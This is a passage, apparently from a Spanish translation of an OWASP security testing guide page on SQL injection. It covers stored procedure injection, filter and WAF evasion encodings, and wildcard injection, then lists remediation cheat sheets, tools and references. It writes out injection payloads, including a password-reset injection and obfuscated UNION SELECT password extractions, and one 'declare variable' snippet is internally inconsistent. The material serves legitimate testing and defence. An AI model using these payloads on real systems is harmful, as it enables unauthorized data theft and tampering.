En este ejemplo, el evaluador está verificando si la versión de MySql es 5.x o no, haciendo que el servidor retrase la respuesta por 10 segundos. El evaluador puede aumentar el tiempo de retraso y monitorear las respuestas. El evaluador también no necesita esperar la respuesta. A veces puede establecer un valor muy alto (por ejemplo, 100) y cancelar la solicitud después de algunos segundos.

#### Stored Procedure Injection

Cuando se usa SQL dinámico dentro de un procedimiento almacenado, la aplicación debe sanitizar adecuadamente la entrada del usuario para eliminar el riesgo de inyección de código. Si no se sanitiza, el usuario podría ingresar código malicioso SQL que se ejecutará dentro del procedimiento almacenado.

Considera el siguiente Procedimiento Almacenado de SQL Server:

```sql
Create procedure user_login @username varchar(20), @passwd varchar(20)
As
Declare @sqlstring varchar(250)
Set @sqlstring  = ‘
Select 1 from users
Where username = ‘ + @username + ‘ and passwd = ‘ + @passwd
exec(@sqlstring)
Go
```

Entrada del usuario:

```sql
anyusername or 1=1'
anypassword
```

Este procedimiento no sanitiza la entrada, permitiendo que el valor de retorno muestre un registro existente con estos parámetros.

> Este ejemplo puede parecer improbable debido al uso de SQL dinámico para iniciar sesión a un usuario, pero considera una consulta de reporte dinámico donde el usuario selecciona las columnas a ver. El usuario podría insertar código malicioso en este escenario y comprometer los datos.

Considera el siguiente Procedimiento Almacenado de SQL Server:

```sql
Create
procedure get_report @columnamelist varchar(7900)
As
Declare @sqlstring varchar(8000)
Set @sqlstring  = ‘
Select ‘ + @columnamelist + ‘ from ReportTable‘
exec(@sqlstring)
Go
```

Entrada del usuario:

```sql
1 from users; update users set password = 'password'; select *
```

Esto resultará en que el reporte se ejecute y todas las contraseñas de los usuarios se actualicen.

#### Automated Exploitation

La mayoría de las situaciones y técnicas presentadas aquí se pueden realizar de manera automatizada usando algunas herramientas. En este artículo, el evaluador puede encontrar información sobre cómo realizar auditoría automatizada usando [SQLMap](https://wiki.owasp.org/index.php/Automated_Audit_using_SQLMap)

### SQL Injection Signature Evasion Techniques

Las técnicas se usan para eludir defensas como firewalls de aplicaciones web (WAF) o sistemas de prevención de intrusiones (IPS). También referirse a [https://owasp.org/www-community/attacks/SQL_Injection_Bypassing_WAF](https://owasp.org/www-community/attacks/SQL_Injection_Bypassing_WAF)

#### Whitespace

Descartar espacio o agregar espacios que no afecten la ejecución de la declaración SQL. Por ejemplo

```sql
or 'a'='a'

or 'a'  =    'a'
```

Agregar caracteres especiales como una nueva línea o tab que no cambien la ejecución de la declaración SQL. Por ejemplo,

```sql
or
'a'=
         'a'
```

#### Null Bytes

Usa byte null (%00) antes de cualquier carácter que el filtro esté bloqueando.

Por ejemplo, si el atacante puede inyectar lo siguiente SQL

`' UNION SELECT password FROM Users WHERE username='admin'--`

para agregar Null Bytes será

`%00' UNION SELECT password FROM Users WHERE username='admin'--`

#### SQL Comments

Agregar comentarios inline SQL también puede ayudar a que la declaración SQL sea válida y eluda el filtro de inyección SQL. Toma esta inyección SQL como ejemplo.

`' UNION SELECT password FROM Users WHERE name='admin'--`

Agregando comentarios inline SQL será:

`'/**/UNION/**/SELECT/**/password/**/FROM/**/Users/**/WHERE/**/name/**/LIKE/**/'admin'--`

`'/**/UNI/**/ON/**/SE/**/LECT/**/password/**/FROM/**/Users/**/WHE/**/RE/**/name/**/LIKE/**/'admin'--`

#### URL Encoding

Usa la [codificación URL en línea](https://meyerweb.com/eric/tools/dencoder/) para codificar la declaración SQL

`' UNION SELECT password FROM Users WHERE name='admin'--`

La codificación URL de la declaración de inyección SQL será

`%27%20UNION%20SELECT%20password%20FROM%20Users%20WHERE%20name%3D%27admin%27--`

#### Character Encoding

La función Char() se puede usar para reemplazar caracteres en inglés. Por ejemplo, char(114,111,111,116) significa root

`' UNION SELECT password FROM Users WHERE name = 'root'--`

Para aplicar Char(), la declaración de inyección SQL será

`' UNION SELECT password FROM Users WHERE name=char(114,111,111,116)--`

#### String Concatenation

La concatenación rompe palabras clave SQL y evade filtros. La sintaxis de concatenación varía según el motor de base de datos. Toma el motor MS SQL como ejemplo

`select 1`

La declaración SQL simple se puede cambiar como abajo usando concatenación

`EXEC('SEL' + 'ECT 1')`

#### Hex Encoding

La técnica de codificación hexadecimal usa codificación hexadecimal para reemplazar el carácter de la declaración SQL original. Por ejemplo, `root` se puede representar como `726F6F74`

`Select user from users where name = 'root'`

La declaración SQL usando el valor HEX será:

`Select user from users where name = 726F6F74`

o

`Select user from users where name = unhex('726F6F74')`

#### Declare Variables

Declara la declaración de inyección SQL en una variable y ejecútala.

Por ejemplo, la declaración de inyección SQL abajo

`Union Select password`

Define la declaración SQL en la variable `SQLivar`

```sql
; declare @SQLivar nvarchar(80); set @myvar = N'UNI' + N'ON' + N' SELECT' + N'password');
EXEC(@SQLivar)
```

#### Alternative Expression of 'or 1 = 1'

```sql
OR 'SQLi' = 'SQL'+'i'
OR 'SQLi' > 'S'
or 20 > 1
OR 2 between 3 and 1
OR 'SQLi' = N'SQLi'
1 and 1 = 1
1 || 1 = 1
1 && 1 = 1
```

### SQL Wildcard Injection

La mayoría de los dialectos SQL soportan comodines de un solo carácter (generalmente "`?`" o "`_`") y comodines de múltiples caracteres (generalmente "`%`" o "`*`"), que se pueden usar en consultas con el operador `LIKE`. Aunque se usen controles apropiados (como parámetros o declaraciones preparadas) para proteger contra ataques de inyección SQL, puede ser posible inyectar comodines en consultas.

Por ejemplo, si una aplicación web permite a los usuarios ingresar un código de descuento como parte del proceso de pago, y verifica si este código existe en la base de datos usando una consulta como `SELECT * FROM discount_codes WHERE code LIKE ':code'`, entonces ingresar un valor de `%` (que se insertaría en lugar del parámetro `:code`) coincidiría con todos los códigos de descuento.

Esta técnica también se podría usar para determinar códigos de descuento exactos a través de consultas cada vez más específicas (como `a%`, `b%`, `ba%`, etc).

## Remediation

- Para asegurar la aplicación contra vulnerabilidades de inyección SQL, referirse a la [Hoja de Trucos de Prevención de Inyección SQL](https://cheatsheetseries.owasp.org/cheatsheets/SQL_Injection_Prevention_Cheat_Sheet.html).
- Para asegurar el servidor SQL, referirse a la [Hoja de Trucos de Seguridad de Base de Datos](https://cheatsheetseries.owasp.org/cheatsheets/Database_Security_Cheat_Sheet.html).

Para validación de entrada genérica de seguridad, referirse a la [Hoja de Trucos de Validación de Entrada](https://cheatsheetseries.owasp.org/cheatsheets/Input_Validation_Cheat_Sheet.html).

## Tools

- [Cadenas de Fuzz de Inyección SQL (de la herramienta wfuzz) - Fuzzdb](https://github.com/fuzzdb-project/fuzzdb/tree/master/attack/sql-injection)
- [Bernardo Damele A. G.: sqlmap, herramienta automática de inyección SQL](https://sqlmap.org/)
- [Muhaimin Dzulfakar: MySqloit, herramienta de apropiación de inyección MySql](https://github.com/dtrip/mysqloit)
- [Inyección SQL - PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection)

## References

- [Top 10 2017-A1-Injection](https://owasp.org/www-project-top-ten/2017/A1_2017-Injection)
- [Inyección SQL](https://owasp.org/www-community/attacks/SQL_Injection)
- [Inyección SQL](https://www.w3schools.com/sql/sql_injection.asp)

Páginas de Guía de Pruebas específicas de tecnología han sido creadas para los siguientes DBMS:

- [Oracle](05.1-Testing_for_Oracle.md)
- [MySQL](05.2-Testing_for_MySQL.md)
- [SQL Server](05.3-Testing_for_SQL_Server.md)
- [PostgreSQL](05.4-Testing_PostgreSQL.md)
- [MS Access](05.5-Testing_for_MS_Access.md)
- [NoSQL](05.6-Testing_for_NoSQL_Injection.md)
- [ORM](05.7-Testing_for_ORM_Injection.md)
- [Client-side](05.8-Testing_for_Client-side.md)

### Whitepapers

- [Victor Chapela: "Advanced SQL Injection"](https://www.cs.unh.edu/~it666/reading_list/Web/advanced_sql_injection.pdf)
- [Chris Anley: "More Advanced SQL Injection"](https://www.cgisecurity.com/lib/more_advanced_sql_injection.pdf)
- [David Litchfield: "Data-mining with SQL Injection and Inference"](https://dl.packetstormsecurity.net/papers/attack/sqlinference.pdf)
- [Imperva: "Blinded SQL Injection"](https://www.imperva.com/lg/lgw.asp?pid=369)
- [PortSwigger: "SQL Injection Cheat Sheet"](https://portswigger.net/web-security/sql-injection/cheat-sheet)
- [Kevin Spett from SPI Dynamics: "Blind SQL Injection"](https://repo.zenk-security.com/Techniques%20d.attaques%20%20.%20%20Failles/Blind_SQLInjection.pdf)
- ["ZeQ3uL" (Prathan Phongthiproek) and "Suphot Boonchamnan": "Beyond SQLi: Obfuscate and Bypass"](https://www.exploit-db.com/papers/17934/)
- [Adi Kaploun and Eliran Goshen, Check Point Threat Intelligence & Research Team: "The Latest SQL Injection Trends"](https://blog.checkpoint.com/latest-sql-injection-trends/)

### Documentation on SQL Injection Vulnerabilities in Products

- [Anatomy of the SQL injection in Drupal's database comment filtering system SA-CORE-2015-003](https://www.vanstechelman.eu/content/anatomy-of-the-sql-injection-in-drupals-database-comment-filtering-system-sa-core-2015-003)